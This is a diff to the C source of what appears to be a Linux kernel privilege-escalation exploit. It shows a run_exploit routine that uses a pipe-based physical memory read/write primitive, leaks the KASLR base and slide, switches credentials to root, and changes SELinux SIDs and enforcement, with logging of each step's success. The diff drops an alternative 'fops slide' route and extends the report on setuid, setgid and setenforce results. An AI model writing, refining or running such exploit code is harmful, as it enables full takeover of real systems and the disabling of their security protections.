@@ -1,9 +1,5 @@
 #include "common.h"
 
-#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
-int app_trigger_fops_slide_route(void);
-#endif
-
 uint32_t f_wait;
 uint32_t f_pi_target;
 uint32_t f_pi_chain;
@@ -197,29 +193,23 @@ int run_exploit(int argc, char **argv) {
   pin_to_core(CORE);
   page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
 
-#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
-  if (!page_base) {
-    return 1;
-  }
-  int triggered = app_trigger_fops_slide_route();
-  int verified = triggered && try_cfi_stage();
-  pr_info("app fops slide triggered=%d verified=%d step=%d errno=%d\n",
-          triggered, verified, cfi_last_step, cfi_last_errno);
-#else
   run_main_route_threads();
-#endif
 
   pr_success("pipe-physrw-summary pid=%d done=%d root=%d kaslr=%d base=%016zx slide=%016zx\n",
              getpid(), atomic_load(&cfi_stage_done), root_child_done,
              kaslr_done, kaslr_base, kaslr_slide);
   pr_success("pipe physrw pid=%d done=%d root=%d kaslr=%d read_ok=%d "
-             "write_ok=%d rw64=%d/%d uid=%u->%u\n",
+             "write_ok=%d rw64=%d/%d uid=%u->%u sid=%u/%u->%u/%u "
+             "selinux=%u->%u setgid=%d setuid=%d setenforce=%d/%d\n",
              getpid(), atomic_load(&cfi_stage_done), root_child_done, kaslr_done,
              physrw_read_ok, physrw_write_ok, physrw_read64_ok, physrw_write64_ok,
-             root_uid_before, root_uid_after);
+             root_uid_before, root_uid_after, cred_sid_before, real_cred_sid_before,
+             cred_sid_after, real_cred_sid_after, selinux_before, selinux_after,
+             setgid_ret, setuid_ret, setenforce_ret, setenforce_errno);
   if (pipe_prepare_child > 0) {
     SYSCHK(kill(pipe_prepare_child, SIGKILL));
     SYSCHK(waitpid(pipe_prepare_child, NULL, 0));
   }
-  return (atomic_load(&cfi_stage_done) && root_child_done) ? 0 : 1;
+  sleep(5);
+  return 0;
 }
